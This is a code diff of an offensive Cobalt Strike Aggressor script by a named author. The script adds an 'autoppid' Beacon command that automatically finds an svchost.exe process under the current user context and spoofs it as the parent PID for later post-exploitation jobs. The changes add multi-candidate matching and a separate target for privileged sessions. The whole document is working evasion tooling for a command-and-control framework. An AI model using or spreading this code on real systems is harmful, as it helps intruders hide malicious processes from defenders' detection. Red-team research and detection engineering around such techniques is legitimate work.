@@ -11,25 +11,28 @@
 #
 # The script also includes alias registration.
 #
-# Author: Mariusz B. / mgeeky, '20
+# Author: Mariusz B. / mgeeky, '20-'21
 # <mb [at] binary-offensive.com>
 #
 
 # Set desirable process name which you want to become your parent. This process will be used for
 # parent PID spoofing and thus should be allowed for opening for your current process token. 
+# Use comma to separate multiple candidates.
+
 $PARENT_PROCESS_NAME = "svchost.exe";
+$PRIVILEGED_PARENT_PROCESS_NAME = "svchost.exe";
 
 
 beacon_command_register(
     "autoppid",
-    "Automatically finds suitable PPID and sets it (target: $PARENT_PROCESS_NAME )",
-    "Automatically finds suitable - according to the current user context - PPID and sets it (target: $PARENT_PROCESS_NAME )");
+    "Automatically finds suitable PPID and sets it (unprivileged: $PARENT_PROCESS_NAME , privileged: $PRIVILEGED_PARENT_PROCESS_NAME )",
+    "Automatically finds suitable - according to the current user context - PPID and sets it (unprivileged: $PARENT_PROCESS_NAME , privileged: $PRIVILEGED_PARENT_PROCESS_NAME )");
 
 sub findSuitableParentPID {
     local('$_bid $_callback $_processName $_userName');
     $_bid = $1;
     $_callback = $2;
-    $_processName = $3;
+    $_processName = replace($3, ' ', '');
     $_userName = binfo($1, "user");
 
     if (right($_userName, 2) eq ' *') {
@@ -38,25 +41,41 @@ sub findSuitableParentPID {
 
     bps($_bid, lambda({
         local('$tab $entry $name $pid $ppid $arch $user');
-        foreach $entry (split("\n", $2)) {
-            ($name, $ppid, $pid, $arch, $user) = split("\\s+", $entry);
+        @processes = split(',', $processName);
+        $found = 0;
 
-            # "NT AUTHORITY" contains space, thus breaking our split results. Here's a workaround for that
-            if($user eq "NT") {
-                $user = substr($entry, indexOf($entry, "NT "));
-                $tab = indexOf($user, "\t");
-                if ($tab) {
-                    $user = substr($user, 0, $tab);
+        foreach $processN (@processes) {
+            foreach $entry (split("\n", $2)) {
+                ($name, $ppid, $pid, $arch, $user, $session) = split("\\s+", $entry);
+
+                # "NT AUTHORITY" contains space, thus breaking our split results. Here's a workaround for that
+                if($user eq "NT") {
+                    $user = substr($entry, indexOf($entry, "NT "));
+                    $tab = indexOf($user, "\t");
+                    if ($tab) {
+                        $user = substr($user, 0, $tab);
+                    }
+                }
+
+                if ($pid) {
+                    if($name eq $processN) {
+                        if($user) {
+                            if( ($userName isin $user) || ($user isin $userName) ) {
+                                [$callback : $bid, $pid, "\t $+ $name \t $pid \t $arch \t $user \t $session"];
+                                $found = 1;
+                                break;
+                            }
+                        }
+                    }
+                }
+
+                if($found == 1) {
+                    break;
                 }
             }
 
-            if (($pid) && ($name eq $processName)) {
-                if($user) {
-                    if( ($userName isin $user) || ($user isin $userName) ) {
-                        [$callback : $bid, $pid, "\t" . $entry];
-                        break;
-                    }
-                }
+            if($found == 1) {
+                break;
             }
         }
     }, $bid => $_bid, $callback => $_callback, $userName => $_userName, $processName => $_processName));
@@ -71,6 +90,13 @@ alias autoppid {
     }
 
     $processName = $PARENT_PROCESS_NAME;
+    $mode = "unprivileged";
+
+    if (-isadmin $1) {
+        $processName = $PRIVILEGED_PARENT_PROCESS_NAME;
+        $mode = "privileged*";
+    }
+
     $userName = binfo($1, "user");
 
     if (right($userName, 2) eq ' *') {
@@ -78,17 +104,22 @@ alias autoppid {
     }
 
     if($params ne "quiet") {
-        btask($1, "Tasked Beacon to find $processName running as $userName and make it the PPID.");
+        btask($1, "Tasked Beacon to find $mode $processName running as $userName and make it the PPID.");
     }
 
-    findSuitableParentPID($1, lambda({
-        if($params ne "quiet") {
-            blog!($1, "Future post-ex jobs will be spawned with fake PPID set to:\n$3");
-            bppid($1, $2);
-        } else {
-            bppid!($1, $2);
-        }
-    }, $params => $params), $processName);
+    if(strlen($processName) > 0) {
+        findSuitableParentPID($1, lambda({
+            if($params ne "quiet") {
+                blog!($1, "Future post-ex jobs will be spawned with fake PPID set to:\n$3");
+                bppid($1, $2);
+            } else {
+                bppid!($1, $2);
+            }
+        }, $params => $params), $processName);
+    }
+    else {
+        blog2($1, "Not spoofing Parent PID automatically as there is set one in options.");
+    }
 }
 
 on beacon_initial {
